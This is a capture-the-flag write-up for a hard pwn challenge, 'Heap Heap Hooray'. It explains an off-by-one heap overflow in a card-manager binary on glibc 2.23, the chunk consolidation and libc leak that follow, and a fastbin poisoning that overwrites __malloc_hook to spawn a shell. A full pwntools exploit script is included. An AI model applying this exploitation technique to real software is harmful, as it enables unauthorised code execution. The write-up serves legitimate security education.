+++
date = '2026-03-03'
title = 'Heap Heap Hooray'
tags = ['pwn', 'hard']
+++

Category: Pwn

Difficulty: Hard (497 points)

Author: Alex Van Mechelen

## Description

Birthdays come once a year, or so they say, With cakes and cards and heap hooray! Some wish for toys, or cake, or a ring, But a shell is my absolute favorite thing!

## Challenge files

[heapheaphooray](files/heapheaphooray), [libc-2.23.so](files/libc-2.23.so)

## Observations

Running the executable gives this output
```
🎈🎂🎉 Welcome to Heap Heap Hooray! 🎉🎂🎈
Create and manage birthday invitation cards!

╔════════════════════════════════════════════╗
║         🎉 HEAP HEAP HOORAY! 🎂            ║
║      Birthday Invitation Card Manager      ║
╚════════════════════════════════════════════╝

  [1] 🎈 Create new invitation card
  [2] ✏️  Edit invitation card
  [3] 👀 View invitation card
  [4] 🔥 Burn invitation card
  [5] 🚪 Exit
```

So we have the following options:
1. Create an invitation card of a size of our choosing on the heap.
2. Edit an invitation card with text of our choosing, storing it in the previously created block of memory.
3. View an invitation card and print it's content.
4. Burn an invitation card and free it's memory.

The vulnerability: if we look at this (cleaned up) decompiled code we can see that `cards[index].data[read_size] = '\0'`
sets the char after the read size to a null byte, the vulnerability lies in the fact that we read up to the card size, 
instead of the card size -1 of data. This is an off by 1 vulnerability which will allow us to edit the first byte right
after this card and set it to a null byte.
```c
void edit_card(void) {
    int scanf_res;
    ssize_t bytes_read;
    char newline_char;
    uint32_t index = 0;
    uint32_t read_size = 0;
    char buffer[1288];

    printf("index: ");
    do {
        scanf_res = scanf("%d%c", &index, &newline_char);
        if ((scanf_res == 2) && (newline_char == '\n')) break;
        scanf_res = skip_line_bugged();
    } while (scanf_res != 0);

    if ((index < 10) && (cards[index].data != NULL) && (cards[index].data != (void *)-1)) {
        printf("data: ");
        bytes_read = read(0, buffer, 0x500);
        read_size = (uint32_t)bytes_read;

        if ((int)read_size < 1) {
            puts("Read failed!");
        } else {
            if (cards[index].size < read_size) {
                read_size = cards[index].size;
            }
            memcpy(cards[index].data, buffer, read_size);
            
            // Vulnerable code
            cards[index].data[read_size] = '\0';
            
            puts("Card updated!");
        }
    } else {
        puts("Invalid index!");
    }
}
```

## Solution

This challenges uses libc 2.23, meaning we have no tCache, but instead have a simpler to exploit fastBin.
PIE is also enabled, so we will need to leak a libc address to get around address randomization.

### Initial setup

First we create 4 blocks of data
1. Block A of size 0x3F8, goes into unsorted bin
2. Block B of size 0x18, goes into fastbin, this will be the trigger chunk
3. Block C of size 0x3F8, this will be the chunk that triggers chunk consolidation
4. Block D of size 0x18, to prevent top chunk consolidation

Keep in mind that malloc has 8 bytes of overhead to store the size of the allocated chunk, so the full size of 0x3F8 chunks will be 0x400 and 0x18 will be 0x20.

### Trigger the off-by-one exploit

1. We will free chunk A, which will go in to the unsorted bin.
2. We will edit the data in chunk B with 16 bytes of padding data, and a 64bit int with content 0x420, this is the exact size of block A + B (including malloc overhead).
   Additionally this will write a null byte in block C's PREV_INUSE field, so C will think the chunk in front of it (chunk B) is not allocated.
3. Now we free chunk C, which since it thinks the previous chunk is unallocated, it will consolidate A, B and C into a big unallocated chunk.

### Leaking libc
 
Libc now thinks chunk B is unallocated, but we still have our access to it, we will exploit this.

1. Create a new chunk (chunk E) of size 0x3F8, exact same size as chunk A. This will cause the unsorted bin to put the address to `__malloc_hook` at the start of chunk B, 
   which allows us to leak libc's address.
2. Now viewing chunk B allows us to calculate the libc base address.

### Getting shell access

1. Create a new chunk of size 0x60, will be created at the same starting address as chunk B.
2. Immediately delete the chunk, causing it to be added to the 0x70 fastbin, and making the first 8 bytes of chunk B store the fd pointer.
3. Overwrite this fd pointer with `libc.sym['__malloc_hook'] - 0x23`, use -0x23 to bypass the 0x70 fastbin size check since there is a `0x7f` byte there.
4. Create a new chunk of size 0x60, this will pop the legitimate chunk from the fastbin list, leaving only our injected pointer.
5. Create another chunk of size 0x60, which will be created in the `__malloc_hook`.
6. Overwrite the malloc hook with an address we got from [one gadget](https://github.com/david942j/one_gadget) to execute `execve('/bin/sh', NULL, NULL)`.
   We do this by adding 19 bytes of padding + the one gadget address payload.
7. Create a new chunk of any size, this will trigger `__malloc_hook`, which will then call `execve('/bin/sh', NULL, NULL)` and give us shell access.


## Solution script
```py
from pwn import *

exe = ELF("./heapheaphooray")
libc = ELF("./libc-2.23.so")

p = exe.process()

def create(size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"size: ", str(size).encode())


def edit(index, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index: ", str(index).encode())
    p.sendafter(b"data: ", data)
    pass

def view(index) -> bytes:
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index: ", str(index).encode())
    return p.recvline()

def burn(index):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"index: ", str(index).encode())


log.info("Phase 1: The Setup")
create(0x3F8)   # Index 0 (A) - 0x400 chunk
create(0x18)    # Index 1 (B) - 0x20 chunk (Trigger)
create(0x3F8)   # Index 2 (C) - 0x400 chunk (Victim)
create(0x18)    # Index 3 (D) - 0x20 chunk (Guard against top chunk consolidation)


log.info("Phase 2: Triggering the off-by-one exploit")
burn(0) # Free Chunk 0 into unsorted bin
payload = b"A" * 16 + p64(0x420)
edit(1, payload) # Overwrite PREV_IN_USE and set size
burn(2) # Free C, consolidates A, B and C


log.info("Phase 3: Leaking Libc")
create(0x3F8) # Allocate chunk of size A so unsorted bin starts at B

# View the unsorted bin to leak libc.
leak = view(1)[:6]
unsorted_bin_addr = u64(leak.ljust(8, b'\x00'))
# In glibc 2.23: Unsorted bin leak = main_arena + 0x58
# main_arena = __malloc_hook + 0x10
libc.address = unsorted_bin_addr - 0x58 - 0x10 - libc.sym['__malloc_hook']
log.success(f"Calculated Libc Base: {hex(libc.address)}")


log.info("Phase 4: Getting shell access")
create(0x60) # Create of size 0x60 to get in fastbin 0x70 bucket
burn(5) # Burn so fastbin fd is at the base of chunk B

# Overwrite the fd pointer with malloc hook
fake_chunk_addr = libc.sym['__malloc_hook'] - 0x23
edit(1, p64(fake_chunk_addr)) 

create(0x60) # Pop legitimate chunk
create(0x60) # Create chunk in malloc hook

# Calculate one gadget adress
one_gadget = libc.address + 0xf03a4
# Overwrite malloc hook with one gadget
payload = b"A" * 19 + p64(one_gadget)
edit(7, payload)

log.info("Phase 5: Pop Shell")
# Call malloc, and voila we have a shell
create(0x10)

log.success("Enjoy your root shell!")
p.interactive()
```